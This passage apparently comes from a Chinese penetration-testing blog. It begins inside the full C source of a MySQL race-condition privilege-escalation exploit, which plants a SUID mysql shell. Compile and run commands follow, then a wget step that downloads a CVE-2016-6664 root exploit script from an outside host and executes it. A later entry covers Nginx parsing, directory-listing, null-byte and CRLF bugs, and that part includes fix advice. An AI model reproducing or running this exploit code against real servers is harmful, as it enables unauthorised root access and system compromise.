punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">intro</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Show initial privileges</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Starting the exploit as: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Connect to the database server with provided credentials</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Connecting to the database `%s` as %s@%s\n"</span><span class="token punctuation">,</span> database<span class="token punctuation">,</span> user<span class="token punctuation">,</span> db_host<span class="token punctuation">)</span><span class="token punctuation">;</span>    conn <span class="token operator">=</span> <span class="token function">mysql_init</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mysql_real_connect</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> db_host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">,</span> database<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// Prepare data dir</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Creating exploit temp directory %s\n"</span><span class="token punctuation">,</span> <span class="token string">"/data/"</span> EXP_DIRN<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm -rf /data/"</span> EXP_DIRN <span class="token string">" &amp;&amp; mkdir /data/"</span> EXP_DIRN<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod g+s /data/"</span> EXP_DIRN <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Prepare exploit tables :)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Creating mysql tables \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"DROP TABLE IF EXISTS exploit_table"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"DROP TABLE IF EXISTS mysql_suid_shell"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span>    <span class="token comment">// The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cp /bin/bash "</span> SUID_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls -l "</span> SUID_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Use inotify to get the timing right</span>    fd <span class="token operator">=</span> <span class="token function">inotify_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"failed to inotify_init\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    ret <span class="token operator">=</span> <span class="token function">inotify_add_watch</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> EXP_PATH<span class="token punctuation">,</span> IN_CREATE <span class="token operator">|</span> IN_CLOSE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Entering the race loop... Hang in there...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> is_shell_suid <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        cnt<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>cnt <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//fflush(stdout);</span>        <span class="token punctuation">}</span>        <span class="token comment">/* Create empty file , remove if already exists */</span>        <span class="token function">unlink</span><span class="token punctuation">(</span>MYSQL_TEMP_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span>MYSQL_TAB_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"DROP TABLE IF EXISTS exploit_table"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* random num if needed */</span>        <span class="token function">srand</span> <span class="token punctuation">(</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        randomnum <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> MAX_DELAY <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span>        pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Fork failed :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">/* Child process - executes REPAIR TABLE  SQL statement */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span>MYSQL_TEMP_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token string">"REPAIR TABLE exploit_table EXTENDED"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// child stops here</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">/* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            io_notified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> processed <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                ret <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>processed <span class="token operator">&lt;</span> ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    event <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inotify_event</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> processed<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token operator">-&gt;</span>mask <span class="token operator">&amp;</span> IN_CLOSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>event<span class="token operator">-&gt;</span>name<span class="token punctuation">,</span> <span class="token string">"exploit_table.TMD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token comment">//usleep(randomnum);</span>                            <span class="token comment">// Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span>                            <span class="token function">unlink</span><span class="token punctuation">(</span>MYSQL_TAB_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>                            myd_handle <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>MYSQL_TAB_FILE<span class="token punctuation">,</span> O_CREAT<span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token function">close</span><span class="token punctuation">(</span>myd_handle<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token function">chmod</span><span class="token punctuation">(</span>MYSQL_TAB_FILE<span class="token punctuation">,</span> <span class="token number">04777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment">// Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span>                            <span class="token function">unlink</span><span class="token punctuation">(</span>MYSQL_TEMP_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token function">symlink</span><span class="token punctuation">(</span>SUID_SHELL<span class="token punctuation">,</span> MYSQL_TEMP_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>                            io_notified<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    processed <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inotify_event</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>io_notified<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">waitpid</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// Check if SUID bit was set at the end of this attempt</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">lstat</span><span class="token punctuation">(</span>SUID_SHELL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>st<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span>st_mode <span class="token operator">&amp;</span> S_ISUID<span class="token punctuation">)</span> <span class="token punctuation">{</span>                is_shell_suid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n"</span><span class="token punctuation">,</span> cnt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls -l "</span> SUID_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span>SUID_SHELL <span class="token string">" -p -i "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//system(SUID_SHELL " -p -c '/bin/bash -i -p'");</span>    <span class="token comment">/* close MySQL connection and exit */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Job done. Exiting\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mysql_close</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081503483.png" alt="image-20210908144343624"></p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><pre class="line-numbers language-none"><code class="language-none">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081503844.png" alt="image-20210908132322344"></p><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><pre class="line-numbers language-none"><code class="language-none">./mysql-privesc-race test 123123 localhost testdb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081503030.png" alt="image-20210908132010693"></p><h3 id="继续将mysql提升为root权限"><a href="#继续将mysql提升为root权限" class="headerlink" title="继续将mysql提升为root权限"></a>继续将mysql提升为root权限</h3><p>注：目标主机配置必须是是基于文件的日志(默认配置)</p><p>tutum/lamp日志方式不是默认的基于文件的日志，而是syslog，所以我们首先要将它改为默认配置</p><pre class="line-numbers language-none"><code class="language-none">vi /etc/mysql/conf.d/mysqld_safe_syslog.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上CVE-2016-6664</p><pre class="line-numbers language-none"><code class="language-none">wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.shchmod 777 mysql-chowned.sh./mysql-chowned.sh /var/log/mysql/error.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081503492.png" alt="image-20210908135037209"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>mof提权主要是针对低版本系统</p><p>ufd提权是很实用的</p><p>组合拳提权则是有一些限制</p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql提权小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx小结</title>
      <link href="/2021/10/28/nginx/"/>
      <url>/2021/10/28/nginx/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Nginx是一个高性能的<a href="https://baike.baidu.com/item/HTTP">HTTP</a>和<a href="https://baike.baidu.com/item/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/7793488">反向代理</a>web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为<a href="https://baike.baidu.com/item/%E4%BF%84%E7%BD%97%E6%96%AF/125568">俄罗斯</a>访问量第二的Rambler.ru站点（俄文：Рамблер）开发的，第一个公开版本0.1.0发布于2004年10月4日。</p><p>其将<a href="https://baike.baidu.com/item/%E6%BA%90%E4%BB%A3%E7%A0%81/3814213">源代码</a>以类<a href="https://baike.baidu.com/item/BSD%E8%AE%B8%E5%8F%AF%E8%AF%81/10642412">BSD许可证</a>的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而<a href="https://baike.baidu.com/item/%E9%97%BB%E5%90%8D/2303308">闻名</a>。2011年6月1日，nginx 1.0.4发布。</p><p>Nginx是一款<a href="https://baike.baidu.com/item/%E8%BD%BB%E9%87%8F%E7%BA%A7/10002835">轻量级</a>的<a href="https://baike.baidu.com/item/Web/150564">Web</a> 服务器/<a href="https://baike.baidu.com/item/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/7793488">反向代理</a>服务器及<a href="https://baike.baidu.com/item/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6/111106">电子邮件</a>（IMAP/POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，<a href="https://baike.baidu.com/item/%E5%B9%B6%E5%8F%91/11024806">并发</a>能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好，中国大陆使</p><p>用Nginx网站用户有：百度、<a href="https://baike.baidu.com/item/%E4%BA%AC%E4%B8%9C/210931">京东</a>、<a href="https://baike.baidu.com/item/%E6%96%B0%E6%B5%AA/125692">新浪</a>、<a href="https://baike.baidu.com/item/%E7%BD%91%E6%98%93/185754">网易</a>、<a href="https://baike.baidu.com/item/%E8%85%BE%E8%AE%AF/112204">腾讯</a>、<a href="https://baike.baidu.com/item/%E6%B7%98%E5%AE%9D/145661">淘宝</a>等。</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><pre class="line-numbers language-none"><code class="language-none">1.适用于高并发2.可以做负载均衡服务器和HTTP服务器3.代码的特点4.可以作为代理服务器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>具体可以自己去了解一下、、、</p><h2 id="可以用来做什么"><a href="#可以用来做什么" class="headerlink" title="可以用来做什么"></a>可以用来做什么</h2><pre class="line-numbers language-none"><code class="language-none">1.静态HTTP服务2.反向代理服务器3.负载均衡4.虚拟主机5.正向代理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体可以自己去了解一下、、、</p><h2 id="Nginx和Apache的比较"><a href="#Nginx和Apache的比较" class="headerlink" title="Nginx和Apache的比较"></a>Nginx和Apache的比较</h2><ul><li>相同点</li></ul><pre class="line-numbers language-none"><code class="language-none">1、都是HTTPServer软件2、功能上都采用模块化结构设计3、都支持通用的语言接口。如PHP、Perl、Python等4、支持正向、反向代理、虚拟主机、URL重写、压缩传输、SSL加密传输<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>不同点</li></ul><pre class="line-numbers language-none"><code class="language-none">1、Apache处理速度非常慢，占用非常多内存资源2、功能上，Apαche全部模块支持动静态编译，Nginx模块都是静态编译的3、对Fcgi的支持：Apache支持的非常不好，Nginx支持非常好4、处理连接方式：Nginx支持epoll，Apache不支持5、空间使用上：Nginx安装包仅几百K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>这边我还是用phpstudy吧</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619179100520.png" alt="1619179100520"></p><p>去看看底层目录</p><p>有一个可执行文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619179181981.png" alt="1619179181981"></p><p>配置文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619179206335.png" alt="1619179206335"></p><p>访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619179443693.png" alt="1619179443693"></p><h2 id="1-文件解析漏洞"><a href="#1-文件解析漏洞" class="headerlink" title="1.文件解析漏洞"></a>1.文件解析漏洞</h2><p>对于任意文件名，在后面添加<code>/xxx.php</code>（xxx为任意字符）即可将文件作为php解析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619180308329.png" alt="1619180308329"></p><p>我们访问2.jpg是不可以的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619180679445.png" alt="1619180679445"></p><p>利用解析漏洞进行绕过</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619180706949.png" alt="1619180706949"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个漏洞是 Nginx配置所导致，与 Nginx版本无关</p><p>当攻击者访问/2.jpg/sss.php时，Nginx将查看URL，看到它以php结尾，并将路径传递给<code>PHP fastcgi</code>处理程序</p><p>去看看Nginx的配置文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619180880357.png" alt="1619180880357"></p><p>当我们继续添加后缀时</p><p>会顺势显示后缀</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619181050576.png" alt="1619181050576"></p><p>php的一个选项：cgi.fix_pathinfo，该选项默认开启，值为1，用于修理路径的</p><p>拿一个例子来捋一下：</p><p>当php遇到文件路径<code>/2.jpg/sss.php/sss.aaa</code>时，若<code>/2.jpg/sss.php/sss.aaa</code>不存在，则会去掉最后的<code>/sss.aaa</code>，然后判断<code>/2.jpg/sss.php</code>是否存在，若存在则将<br><code>/2.jpg/sss.php</code>当作文件<code>/2.jpg/sss.php/sss.aaa</code>若<code>/2.jpg/sss.php</code>仍不存在，则继续去掉<code>sss.php</code>，依此类推</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><pre class="line-numbers language-none"><code class="language-none">1.配置cgi.fix_pathinfo（php.ini中）为0并重启php-cgi程序！2.如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。或将上传存储的內容与网站分离，即站库分离。3.高版本PHP提供了 security.Limit_extensions这个配置参数，设置 security.Limit extensions= .php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-目录遍历漏洞"><a href="#2-目录遍历漏洞" class="headerlink" title="2.目录遍历漏洞"></a>2.目录遍历漏洞</h2><p>Nginx的目录遍历属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露</p><p>复现去修改一下</p><p>去配置文件中</p><pre class="line-numbers language-none"><code class="language-none">C:\phpStudy\nginx\conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619181150896.png" alt="1619181150896"></p><p>把这个开关开起来 （改成on）</p><p>然后我们访问目录时 会构成目录遍历</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619181345044.png" alt="1619181345044"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619181319132.png" alt="1619181319132"></p><h2 id="3-空字节任意代码执行漏洞"><a href="#3-空字节任意代码执行漏洞" class="headerlink" title="3.空字节任意代码执行漏洞"></a>3.空字节任意代码执行漏洞</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Nginx在遇到<code>%00</code>空字节时与后端 <code>FastCGI</code>处理不一致，导致可以在图片中嵌入PHP代码然后通过访问 <code>xxx.jpg%00.php</code>来执行其中的代码！</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre class="line-numbers language-none"><code class="language-none">nginx 0.5.*nginx 0.6.*nginx 0.7 &lt;= 0.7.65nginx 0.8 &lt;= 0.8.37<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>文件目录在这里</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619182073158.png" alt="1619182073158"></p><p>写一个phpinfo的1.php  访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619182395414.png" alt="1619182395414"></p><p>搞一个phpinfo的3.jpg文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619182674765.png" alt="1619182674765"></p><p>抓包进行修改</p><p>随便<code>..</code>  不然抓不了包</p><p>因为它是无法访问的图片</p><p>正常图片的话 就是可以的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619182916445.png" alt="1619182916445"></p><p>漏洞来了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619183034111.png"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619183787754.png" alt="1619183787754"></p><p>把这里修改成00  形成空字节 然后放包  </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619183814538.png" alt="1619183814538"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619183735849.png" alt="1619183735849"></p><h2 id="4-CRLF漏洞"><a href="#4-CRLF漏洞" class="headerlink" title="4.CRLF漏洞"></a>4.CRLF漏洞</h2><h3 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>Nginⅸx会将<code>$uri</code>进行解码，导致传入<code>%0a%d</code>即可引入<strong>换行符</strong>，造成CRLF注入漏洞</p><p>错误的配置文件</p><p>是这样</p><pre class="line-numbers language-none"><code class="language-none">location / {  return 302 https://$host$uri;}<span aria-hidden="true" 